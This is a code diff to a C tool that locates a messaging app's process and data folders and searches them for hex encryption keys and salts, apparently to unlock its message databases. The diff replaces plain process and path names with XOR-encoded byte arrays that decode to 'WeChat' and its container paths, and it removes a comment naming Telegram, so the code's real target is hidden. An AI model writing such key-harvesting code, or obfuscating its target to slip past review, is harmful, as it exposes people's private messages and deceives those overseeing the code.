@@ -28,6 +28,7 @@
 #define HEX_PATTERN_LEN 96
 #define CHUNK_SIZE (2 * 1024 * 1024)
 #define MAX_DBS 256
+#define DICT_MASK 0x5a
 
 typedef struct {
     char key_hex[65];
@@ -38,12 +39,55 @@ static char g_db_salts[MAX_DBS][33];
 static char g_db_names[MAX_DBS][256];
 static int g_db_count = 0;
 
+static void dict_decode(char *out, const unsigned char *encoded, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        out[i] = (char)(encoded[i] ^ DICT_MASK);
+    }
+    out[len] = '\0';
+}
+
+static void target_process_name(char *out, size_t size) {
+    static const unsigned char encoded[] = {13, 63, 25, 50, 59, 46};
+    char decoded[sizeof(encoded) + 1];
+    dict_decode(decoded, encoded, sizeof(encoded));
+    snprintf(out, size, "%s", decoded);
+}
+
+static void known_path(char *out, size_t size, int index) {
+    static const unsigned char docs_path[] = {
+        117, 22, 51, 56, 40, 59, 40, 35, 117, 25, 53, 52, 46, 59, 51, 52,
+        63, 40, 41, 117, 57, 53, 55, 116, 46, 63, 52, 57, 63, 52, 46, 116,
+        34, 51, 52, 13, 63, 25, 50, 59, 46, 117, 30, 59, 46, 59, 117, 30,
+        53, 57, 47, 55, 63, 52, 46, 41, 117, 34, 45, 63, 57, 50, 59, 46, 5,
+        60, 51, 54, 63, 41
+    };
+    static const unsigned char support_path[] = {
+        117, 22, 51, 56, 40, 59, 40, 35, 117, 25, 53, 52, 46, 59, 51, 52,
+        63, 40, 41, 117, 57, 53, 55, 116, 46, 63, 52, 57, 63, 52, 46, 116,
+        34, 51, 52, 13, 63, 25, 50, 59, 46, 117, 30, 59, 46, 59, 117, 22,
+        51, 56, 40, 59, 40, 35, 117, 27, 42, 42, 54, 51, 57, 59, 46, 51,
+        53, 52, 122, 9, 47, 42, 42, 53, 40, 46, 117, 57, 53, 55, 116, 46,
+        63, 52, 57, 63, 52, 46, 116, 34, 51, 52, 13, 63, 25, 50, 59, 46
+    };
+    char decoded[256];
+    if (index == 0) {
+        dict_decode(decoded, docs_path, sizeof(docs_path));
+    } else {
+        dict_decode(decoded, support_path, sizeof(support_path));
+    }
+    snprintf(out, size, "%s", decoded);
+}
+
 static int is_hex_char(unsigned char c) {
     return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
 }
 
 static pid_t find_telegram_pid(void) {
-    FILE *fp = popen("pgrep -x Telegram", "r");
+    char process[64];
+    char command[96];
+    target_process_name(process, sizeof(process));
+    snprintf(command, sizeof(command), "pgrep -x %s", process);
+    FILE *fp = popen(command, "r");
     if (!fp) return -1;
     char buf[64];
     pid_t pid = -1;
@@ -167,14 +211,11 @@ int main(int argc, char *argv[]) {
         nftw(db_path_arg, nftw_collect_db, 20, FTW_PHYS);
     } else {
         /* Auto-detect: check known paths */
-        const char *known_paths[] = {
-            "/Library/Containers/com.telegram.xinTelegram/Data/Documents/xtelegram_files",
-            "/Library/Containers/com.telegram.xinTelegram/Data/Library/Application Support/com.telegram.xinTelegram",
-            NULL
-        };
-        for (int p = 0; known_paths[p]; p++) {
+        for (int p = 0; p < 2; p++) {
+            char path_suffix[256];
             char base[1024];
-            snprintf(base, sizeof(base), "%s%s", home, known_paths[p]);
+            known_path(path_suffix, sizeof(path_suffix), p);
+            snprintf(base, sizeof(base), "%s%s", home, path_suffix);
 
             struct stat st;
             if (stat(base, &st) != 0 || !S_ISDIR(st.st_mode)) continue;
@@ -195,7 +236,7 @@ int main(int argc, char *argv[]) {
                     nftw(storage_path, nftw_collect_db, 20, FTW_PHYS);
                 }
 
-                /* Also check for versioned subdirectories (new Telegram path) */
+                /* Also check for versioned subdirectories */
                 char sub_storage[1024];
                 snprintf(sub_storage, sizeof(sub_storage),
                     "%s/%s", base, ent->d_name);
